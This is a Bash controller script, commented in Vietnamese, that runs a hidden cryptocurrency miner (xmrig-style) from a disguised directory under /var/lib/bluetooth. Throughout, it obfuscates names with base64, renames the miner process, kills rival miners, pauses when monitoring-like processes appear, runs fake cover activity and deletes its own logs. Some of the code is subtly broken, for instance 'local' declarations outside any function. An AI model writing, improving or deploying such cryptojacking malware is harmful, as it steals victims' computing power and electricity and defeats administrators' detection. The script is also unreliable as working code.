#!/bin/bash

# Thiết lập biến BASE_DIR_ENCODED ở đây - ĐẶT TRƯỚC MỌI THỨ KHÁC
# Điều này phải được hardcode hoặc lấy từ môi trường cha nếu script được tạo động.
# Trong trường hợp này, nó được tạo từ script cài đặt, nên giá trị này an toàn.
base_dir_encoded="$(echo "/var/lib/bluetooth/system_profiles/profile_cache" | base64)" 

# --- CÁC HÀM (PHẢI ĐƯỢC ĐỊNH NGHĨA ĐẦU TIÊN) ---

decode_string() {
    echo "$1" | base64 -d
}

log_message() {
    # Đường dẫn log cũng cần được giải mã
    local CONTROLLER_LOG_PATH="$(decode_string "$base_dir_encoded")/controller.log"
    echo "$(date +'%Y-%m-%d %H:%M:%S'): $1" >> "$CONTROLLER_LOG_PATH"
}

stop_miner() {
    local decoded_fake_process_names=()
    # Các biến bin_names_encoded, fake_process_names_encoded, MINER_ACTUAL_PATH_ENCODED
    # cần được truyền vào hàm hoặc là biến toàn cục được định nghĩa trước khi hàm được gọi.
    # Trong trường hợp này, chúng là biến toàn cục và sẽ được định nghĩa ngay sau phần hàm.
    for encoded_name in "${fake_process_names_encoded[@]}"; do
        decoded_fake_process_names+=("$(decode_string "$encoded_name")")
    done
    local decoded_bin_names=()
    for encoded_name in "${bin_names_encoded[@]}"; do
        decoded_bin_names+=("$(decode_string "$encoded_name")")
    done

    # Kiểm tra và kill các tiến trình miner dựa trên tên giả và tên thật của binary
    # Dòng này đã được sửa để sử dụng đúng biến MINER_ACTUAL_PATH_ENCODED
    local pids_to_kill=$(pgrep -f "minerd|xmrig|cpuminer|$(IFS='|'; echo "${decoded_fake_process_names[*]}")|$(IFS='|'; echo "${decoded_bin_names[*]}")|$(decode_string "$MINER_ACTUAL_PATH_ENCODED")" | grep -v "$$" | grep -v "master_controller.sh")

    if [ -n "$pids_to_kill" ]; then
        for pid in $pids_to_kill; do
            kill -9 "$pid" > /dev/null 2>&1
        done
        log_message "Stopped existing miner processes."
    fi
}

start_miner() {
    local config_id="$1"
    local current_bin_name_encoded="$2"
    local current_bin_name="$(decode_string "$current_bin_name_encoded")"
    local config_file="config_profile_${config_id}.json"
    local miner_config_full_path="$(decode_string "$base_dir_encoded")/$config_file"

    local actual_miner_binary_path="$(decode_string "$MINER_ACTUAL_PATH_ENCODED")"
    local wrapper_path="$(decode_string "$base_dir_encoded")/$WRAPPER_BINARY_NAME"

    # Kiểm tra xem miner có đang chạy với tên giả định đó không
    if pgrep -f "$current_bin_name" > /dev/null; then
        log_message "Miner already running with fake name: $current_bin_name. No action needed."
        return 0
    fi

    # Đảm bảo dừng các tiến trình cũ trước khi khởi động cái mới
    stop_miner

    if [ -n "$WRAPPER_BINARY_NAME" ] && [ -f "$wrapper_path" ] && [ -f "$actual_miner_binary_path" ] && [ -f "$miner_config_full_path" ]; then
        # Chạy miner qua C wrapper
        nohup "$wrapper_path" "$current_bin_name" "$actual_miner_binary_path" "$miner_config_full_path" > /dev/null 2>&1 &
        log_message "Miner started via C wrapper (fake name: $current_bin_name, pid: $!)."
    elif [ -f "$actual_miner_binary_path" ] && [ -f "$miner_config_full_path" ]; then
        # Chạy trực tiếp nếu wrapper không có
        nohup "$actual_miner_binary_path" -c "$miner_config_full_path" > /dev/null 2>&1 &
        log_message "WARNING: C wrapper not available. Miner started directly (pid: $!). Less stealthy."
    else
        log_message "ERROR: Missing miner binary, wrapper, or config file. Cannot start miner."
    fi
}

run_fake_activity() {
    # Ensure CHANCE_FOR_FAKE_ACTIVITY is available globally or passed
    if (( RANDOM % 100 < CHANCE_FOR_FAKE_ACTIVITY )); then
        local activity_info_encoded=${fake_activity_commands_encoded[$RANDOM % ${#fake_activity_commands_encoded[@]}]}
        local activity_info="$(decode_string "$activity_info_encoded")"

        local cmd="$(echo "$activity_info" | cut -d',' -f1)"
        local min_duration="$(echo "$activity_info" | cut -d',' -f2)"
        local max_duration="$(echo "$activity_info" | cut -d',' -f3)"
        local activity_type="$(echo "$activity_info" | cut -d',' -f4)"

        local duration_seconds=$(( min_duration + RANDOM % (max_duration - min_duration + 1) ))

        # Chạy lệnh trong subshell và chuyển sang nền
        ( nohup bash -c "export MINER_DIR=$(decode_string "$base_dir_encoded"); timeout $duration_seconds $cmd" > /dev/null 2>&1 & )
        log_message "Running fake activity ($activity_type) command: '$cmd' for $duration_seconds seconds."
    fi
}

is_xmrig_active() {
    # STATE_FILE and other global vars need to be accessible
    local STATE_FILE_PATH="$(decode_string "$base_dir_encoded")/.miner_state"
    local state_data="$(cat "$STATE_FILE_PATH" 2>/dev/null)"
    local current_bin_name_encoded="$(echo "$state_data" | awk '{print $3}')"
    local current_bin_name="$(decode_string "$current_bin_name_encoded")"

    if [ -z "$current_bin_name" ]; then return 1; fi

    if pgrep -f "$current_bin_name" > /dev/null; then
        return 0
    fi
    return 1
}

check_for_suspicious_processes() {
    local decoded_keywords=()
    for encoded_kw in "${suspicious_process_keywords_encoded[@]}"; do
        decoded_keywords+=("$(decode_string "$encoded_kw")")
    done

    local ps_output=$(ps aux)

    for keyword in "${decoded_keywords[@]}"; do
        if echo "$ps_output" | grep -F "$keyword" | grep -v "grep" | grep -v "$$" | grep -v "master_controller.sh" > /dev/null; then
            log_message "WARNING: Suspicious process detected: '$keyword'. Initiating pause."
            return 0
        fi
    done
    return 1
}

run_cleanup() {
    local base_dir="$(decode_string "$base_dir_encoded")"
    cd "$base_dir" || return 1

    find . -name "xmrig_profile_*.log" -delete > /dev/null 2>&1
    rm -f "controller.log" > /dev/null 2>&1
    rm -f "temp_block_*" > /dev/null 2>&1
    rm -f "temp_archive_*.tar.gz" > /dev/null 2>&1
    rm -f /tmp/temp_app_file_* > /dev/null 2>&1
    rm -f /tmp/temp_app_data_* > /dev/null 2>&1
    log_message "Cleanup of temporary files and logs completed."
    # LAST_CLEANUP_TIMESTAMP is a global variable and updated directly.
    LAST_CLEANUP_TIMESTAMP=$(date +%s) 
}

# --- KHAI BÁO BIẾN TOÀN CỤC (SAU KHI CÁC HÀM ĐƯỢC ĐỊNH NGHĨA) ---
# Các biến này được khởi tạo bằng cách gọi hàm hoặc sử dụng các biến khác
# được cung cấp bởi script cài đặt.
bin_names_encoded=(
    $(for name in "${BIN_NAMES[@]}"; do echo -n "\"$(echo "$name" | base64)\" "; done)
)
fake_process_names_encoded=(
    $(for name in "${FAKE_PROCESS_NAMES[@]}"; do echo -n "\"$(echo "$name" | base64)\" "; done)
)
cpu_profiles_encoded=(
    $(for profile in "${CPU_PROFILES[@]}"; do echo -n "\"$(echo "$profile" | base64)\" "; done)
)
fake_activity_commands_encoded=(
    $(for cmd in "${FAKE_ACTIVITY_COMMANDS[@]}"; do echo -n "\"$(echo "$cmd" | base64)\" "; done)
)
suspicious_process_keywords_encoded=(
    $(for kw in "${SUSPICIOUS_PROCESS_KEYWORDS[@]}"; do echo -n "\"$(echo "$kw" | base64)\" "; done)
)

# Các biến sau đây cần được "truyền" vào master_controller.sh từ script cài đặt
# Hoặc khai báo trực tiếp ở đây với giá trị mặc định nếu không có.
# Giả sử chúng được truyền qua environment hoặc hardcode trong script tạo ra nó.
# (Chúng ta đang đặt chúng trực tiếp từ script cha)
CHANCE_TO_RUN="$CHANCE_TO_RUN"
CHANCE_TO_SWITCH_PROFILE="$CHANCE_TO_SWITCH_PROFILE"
CHANCE_TO_CHANGE_BIN_NAME="$CHANCE_TO_CHANGE_BIN_NAME"
CHANCE_FOR_LONG_PAUSE="$CHANCE_FOR_LONG_PAUSE"
LONG_PAUSE_MIN_HOURS="$LONG_PAUSE_MIN_HOURS"
LONG_PAUSE_MAX_HOURS="$LONG_PAUSE_MAX_HOURS"
CHANCE_FOR_FAKE_ACTIVITY="$CHANCE_FOR_FAKE_ACTIVITY"
SUSPICIOUS_PAUSE_MIN_SECONDS="$SUSPICIOUS_PAUSE_MIN_SECONDS"
SUSPICIOUS_PAUSE_MAX_SECONDS="$SUSPICIOUS_PAUSE_MAX_SECONDS"
WRAPPER_BINARY_NAME="$WRAPPER_BINARY_NAME"
MINER_ACTUAL_PATH_ENCODED="$(echo "$MINER_ACTUAL_PATH" | base64)" # Đây là biến cần MINER_ACTUAL_PATH từ script cha

# File trạng thái và log
STATE_FILE="$(decode_string "$base_dir_encoded")/.miner_state"
# Đảm bảo file tồn tại và có quyền phù hợp
touch "$STATE_FILE" > /dev/null 2>&1
chmod 600 "$STATE_FILE" > /dev/null 2>&1

# Biến để theo dõi thời gian dọn dẹp
CLEANUP_INTERVAL_SECONDS=$((4 * 3600)) # 4 tiếng một lần
LAST_CLEANUP_TIMESTAMP=$(date +%s) # Khởi tạo lần đầu

# --- Vòng lặp chính để duy trì miner ---
echo "--------------------------------------------------------"
echo " MINER CONTROLLER: ĐANG CHẠY TRONG TERMINAL NÀY "
echo "--------------------------------------------------------"
echo "Để đưa miner ra nền (background):"
echo "  Nhấn Ctrl+Z, sau đó gõ 'bg' và Enter."
echo "Để dừng miner hoàn toàn (cả controller và miner):"
echo "  Nhấn Ctrl+C."
echo "--------------------------------------------------------"
sleep 2

while true; do
    current_timestamp=$(date +%s)
    # Đọc trạng thái từ file
    # Không dùng 'local' cho các biến này nếu chúng cần được duy trì qua các lần lặp của vòng lặp
    # Tuy nhiên, trong trường hợp này, chúng được đọc lại mỗi lần lặp, nên 'local' là ổn
    local state_data="$(cat "$STATE_FILE" 2>/dev/null)"
    local last_run_timestamp="$(echo "$state_data" | awk '{print $1}')"
    local current_profile_id="$(echo "$state_data" | awk '{print $2}')"
    local current_bin_name_encoded="$(echo "$state_data" | awk '{print $3}')"
    local long_pause_end_timestamp="$(echo "$state_data" | awk '{print $4}')"
    local suspicious_pause_end_timestamp="$(echo "$state_data" | awk '{print $5}')"

    # Thực hiện dọn dẹp định kỳ
    if (( current_timestamp - LAST_CLEANUP_TIMESTAMP > CLEANUP_INTERVAL_SECONDS )); then
        run_cleanup
    fi

    # Kiểm tra tạm dừng dài hạn
    if [ -n "$long_pause_end_timestamp" ] && (( current_timestamp < long_pause_end_timestamp )); then
        stop_miner
        log_message "Still in long pause until $(date -d @$long_pause_end_timestamp). Miner stopped."
        echo "$(date +'%Y-%m-%d %H:%M:%S'): Miner tạm dừng (long pause) đến $(date -d @$long_pause_end_timestamp)..."
        echo "$current_timestamp $current_profile_id $current_bin_name_encoded $long_pause_end_timestamp $suspicious_pause_end_timestamp" > "$STATE_FILE"
        run_fake_activity
        sleep 60 # Kiểm tra lại sau 1 phút
        continue
    fi

    # Kiểm tra tạm dừng do tiến trình đáng ngờ
    if [ -n "$suspicious_pause_end_timestamp" ] && (( current_timestamp < suspicious_pause_end_timestamp )); then
        stop_miner
        log_message "Still in suspicious activity pause until $(date -d @$suspicious_pause_end_timestamp). Miner stopped."
        echo "$(date +'%Y-%m-%d %H:%M:%S'): Miner tạm dừng (suspicious pause) đến $(date -d @$suspicious_pause_end_timestamp)..."
        echo "$current_timestamp $current_profile_id $current_bin_name_encoded $long_pause_end_timestamp $suspicious_pause_end_timestamp" > "$STATE_FILE"
        run_fake_activity
        sleep 60 # Kiểm tra lại sau 1 phút
        continue
    fi

    # Phát hiện tiến trình đáng ngờ
    if check_for_suspicious_processes; then
        stop_miner
        local pause_duration=$(( SUSPICIOUS_PAUSE_MIN_SECONDS + RANDOM % (SUSPICIOUS_PAUSE_MAX_SECONDS - SUSPICIOUS_PAUSE_MIN_SECONDS + 1) ))
        suspicious_pause_end_timestamp=$(( current_timestamp + pause_duration ))
        log_message "Detected suspicious process. Pausing miner for $((pause_duration / 60)) minutes."
        echo "$(date +'%Y-%m-%d %H:%M:%S'): PHÁT HIỆN TIẾN TRÌNH ĐÁNG NGỜ! Tạm dừng miner trong $((pause_duration / 60)) phút."
        echo "$current_timestamp $current_profile_id $current_bin_name_encoded $long_pause_end_timestamp $suspicious_pause_end_timestamp" > "$STATE_FILE"
        run_fake_activity
        sleep 60 # Kiểm tra lại sau 1 phút
        continue
    fi

    # Kết thúc tạm dừng đáng ngờ
    if [ -n "$suspicious_pause_end_timestamp" ] && (( current_timestamp >= suspicious_pause_end_timestamp )); then
        log_message "Suspicious activity pause ended. Resuming normal operations."
        echo "$(date +'%Y-%m-%d %H:%M:%S'): Tạm dừng đáng ngờ kết thúc. Khởi động lại miner."
        suspicious_pause_end_timestamp="" # Đặt lại biến
    fi

    local should_run_miner=0
    if is_xmrig_active; then
        local profile_info=${cpu_profiles_encoded[$current_profile_id]}
        local decoded_profile_info="$(decode_string "$profile_info")"
        local min_duration_minutes="$(echo "$decoded_profile_info" | cut -d',' -f4)"
        local max_duration_minutes="$(echo "$decoded_profile_info" | cut -d',' -f5)"

        local time_since_last_run_minutes=$(( (current_timestamp - last_run_timestamp) / 60 ))

        if (( time_since_last_run_minutes >= max_duration_minutes )) || (( RANDOM % 100 < CHANCE_TO_SWITCH_PROFILE )); then
            stop_miner
            log_message "Miner finished current profile or switching. Stopping miner."
            echo "$(date +'%Y-%m-%d %H:%M:%S'): Miner đã hoàn thành profile hoặc sắp chuyển đổi. Đang dừng miner."

            # Kiểm tra tạm dừng dài hạn sau khi kết thúc chu kỳ đào
            if (( RANDOM % 100 < CHANCE_FOR_LONG_PAUSE )); then
                local pause_duration_hours=$(( LONG_PAUSE_MIN_HOURS + RANDOM % (LONG_PAUSE_MAX_HOURS - LONG_PAUSE_MIN_HOURS + 1) ))
                long_pause_end_timestamp=$(( current_timestamp + pause_duration_hours * 3600 ))
                log_message "Entering long pause for $pause_duration_hours hours until $(date -d @$long_pause_end_timestamp)."
                echo "$(date +'%Y-%m-%d %H:%M:%S'): Đang tạm dừng dài hạn trong $pause_duration_hours giờ đến $(date -d @$long_pause_end_timestamp)."
                echo "$current_timestamp $current_profile_id $current_bin_name_encoded $long_pause_end_timestamp $suspicious_pause_end_timestamp" > "$STATE_FILE"
                run_fake_activity
                sleep 60 # Kiểm tra lại sau 1 phút
                continue
            fi

            # Chọn profile và tên binary mới
            current_profile_id=$(( RANDOM % ${#cpu_profiles_encoded[@]} ))
            if (( RANDOM % 100 < CHANCE_TO_CHANGE_BIN_NAME )); then
                current_bin_name_encoded=${bin_names_encoded[$RANDOM % ${#bin_names_encoded[@]}]}
            else
                if [ -z "$current_bin_name_encoded" ]; then
                    current_bin_name_encoded=${bin_names_encoded[$RANDOM % ${#bin_names_encoded[@]}]}
                fi
            fi # Dòng này đã được sửa lỗi, trước đó thiếu 'fi'
            should_run_miner=1
        else
            log_message "Miner still running current profile. Next check in $(( max_duration_minutes - time_since_last_run_minutes )) minutes."
            echo "$(date +'%Y-%m-%d %H:%M:%S'): Miner đang chạy profile hiện tại. Kiểm tra lại sau $(( max_duration_minutes - time_since_last_run_minutes )) phút."
            should_run_miner=0
        fi
    else # Nếu miner không hoạt động
        # Kiểm tra nếu tạm dừng dài hạn đã kết thúc
        if [ -n "$long_pause_end_timestamp" ] && (( current_timestamp >= long_pause_end_timestamp )); then
            log_message "Long pause ended. Resuming normal operations."
            echo "$(date +'%Y-%m-%d %H:%M:%S'): Tạm dừng dài hạn kết thúc. Tiếp tục hoạt động bình thường."
            long_pause_end_timestamp="" # Đặt lại biến
        fi

        # Khởi tạo profile và tên binary nếu chưa có
        if [ -z "$current_profile_id" ] || [ -z "$current_bin_name_encoded" ]; then
            current_profile_id=$(( RANDOM % ${#cpu_profiles_encoded[@]} ))
            current_bin_name_encoded=${bin_names_encoded[$RANDOM % ${#bin_names_encoded[@]}]}
            log_message "Initializing miner with new profile and binary name."
            echo "$(date +'%Y-%m-%d %H:%M:%S'): Khởi tạo miner với profile và tên binary mới."
        fi

        # Quyết định có nên chạy miner hay không dựa trên CHANCE_TO_RUN
        if (( RANDOM % 100 < CHANCE_TO_RUN )); then
            should_run_miner=1
            log_message "Chance to run met. Attempting to start miner."
            echo "$(date +'%Y-%m-%d %H:%M:%S'): Đủ điều kiện chạy. Đang cố gắng khởi động miner."
        else
            log_message "Chance to run not met. Miner remains stopped."
            echo "$(date +'%Y-%m-%d %H:%M:%S'): Không đủ điều kiện chạy. Miner vẫn tạm dừng."
        fi
    fi

    # Khởi động miner nếu được quyết định
    if [ "$should_run_miner" -eq 1 ]; then
        start_miner "$current_profile_id" "$current_bin_name_encoded"
        echo "$current_timestamp $current_profile_id $current_bin_name_encoded $long_pause_end_timestamp $suspicious_pause_end_timestamp" > "$STATE_FILE"
    else # Nếu không chạy, vẫn cập nhật trạng thái
        echo "$current_timestamp $current_profile_id $current_bin_name_encoded $long_pause_end_timestamp $suspicious_pause_end_timestamp" > "$STATE_FILE"
    fi

    run_fake_activity

    # Thời gian chờ giữa các lần kiểm tra chính
    sleep 60 # Chạy lại vòng lặp mỗi phút để kiểm tra và duy trì
done
